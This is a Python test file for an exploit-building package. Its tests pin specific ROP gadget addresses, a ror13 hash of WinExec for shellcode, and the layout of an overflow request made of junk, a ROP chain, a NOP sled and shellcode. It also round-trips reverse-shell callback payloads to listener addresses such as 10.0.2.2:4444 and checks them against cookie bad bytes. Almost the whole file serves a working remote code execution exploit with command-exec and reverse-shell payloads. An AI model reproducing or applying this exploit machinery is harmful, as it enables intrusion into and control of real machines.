from __future__ import annotations

import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

import pytest

from request_builder.rop import (
    build_rop_chain,
    CALL_EDX,
    PPR_ADD_ESP_24C,
    CRAFTED_JMP_ESP,
    TEST_BL_ZERO,
    MOV_EAX_EBX,
    ADD_EAX_FINISH,
    PUSH_EAX_RET,
    JUNK0_LEN,
    JUNK1_LEN,
    MID_NOPSLED_LEN,
    NOP,
    FILLER,
)
from request_builder.shellcode import (
    build_exec_bytes,
    parse_exec_command,
    BAD_BYTES,
    WINEXEC_HASH,
    ror13,
)
from request_builder.shellcode_callback import (
    build_callback_bytes,
    parse_lhost_lport,
)
from request_builder.request import build_http_request


def test_rop_constants_match_literature():
    assert CALL_EDX == 0x1001D8C8
    assert PPR_ADD_ESP_24C == 0x10010101
    assert CRAFTED_JMP_ESP == 0xA4523C15
    assert TEST_BL_ZERO == 0x10010125
    assert MOV_EAX_EBX == 0x10022AAC
    assert ADD_EAX_FINISH == 0x1001A187
    assert PUSH_EAX_RET == 0x1002466D


def test_winexec_hash():
    assert ror13(b"WinExec") == WINEXEC_HASH


def test_request_length():
    sc = build_exec_bytes("calc")
    rop = build_rop_chain(sc)
    expected = (
        JUNK0_LEN
        + 4  # call_edx
        + JUNK1_LEN
        + 4  # ppr
        + 4  # crafted_jmp_esp
        + 4  # test_bl
        + 4  # kungfu: mov eax,ebx
        + 4  # kungfu: filler
        + 4  # kungfu: filler
        + 4  # kungfu: add eax finish
        + 4  # kungfu: push eax ret
        + MID_NOPSLED_LEN
        + len(sc)
    )
    assert len(rop) == expected


def test_callback_roundtrip():
    for lhost, lport in [("1.2.3.4", 4444), ("11.22.33.44", 8080), ("10.0.2.2", 4444)]:
        data = build_callback_bytes(lhost, lport)
        host2, port2 = parse_lhost_lport(data)
        assert host2 == lhost
        assert port2 == lport


def test_callback_cookie_safe():
    from request_builder.request import COOKIE_BAD_BYTES

    data = build_callback_bytes("10.0.2.2", 4444)
    assert not any(b in COOKIE_BAD_BYTES for b in data)


def test_exec_command_embedded():
    cmd = "ipconfig"
    data = build_exec_bytes(cmd)
    extracted = parse_exec_command(data)
    assert extracted == cmd


def test_bad_char_rejection():
    for bad in (b"\x00", b"\x20", b"\x3b", b"\x0a", b"\x0d"):
        cmd = "cmd" + bad.decode("latin-1") + "exe"
        with pytest.raises(ValueError):
            build_exec_bytes(cmd)
